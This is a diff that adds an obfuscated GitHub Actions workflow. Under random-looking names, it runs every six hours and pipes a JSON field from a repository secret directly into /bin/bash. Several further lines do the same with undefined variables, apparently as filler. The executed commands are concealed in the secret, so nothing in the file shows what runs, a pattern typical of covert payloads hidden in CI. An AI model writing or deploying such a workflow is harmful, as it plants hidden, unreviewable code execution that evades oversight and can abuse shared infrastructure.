@@ -1,0 +1,25 @@
+name: dugoutepee
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dugoutepee
+        env:
+          kdx1931: ${{ secrets.kdx1931 }}
+        run: |
+          echo $kdx1931 | jq -r .m7292 | /bin/bash
+          echo $nkk1043 | jq -r .nllyi42 | /bin/bash
+          echo $jdn055 | jq -r .ts307 | /bin/bash
+          echo $lhgk201 | jq -r .mena96 | /bin/bash
+          echo $btj0 | jq -r .gh18 | /bin/bash
+          echo $q9 | jq -r .w60560 | /bin/bash
+          echo $twp34 | jq -r .wfe161 | /bin/bash
+          echo $wokja0 | jq -r .ttr7847 | /bin/bash
+
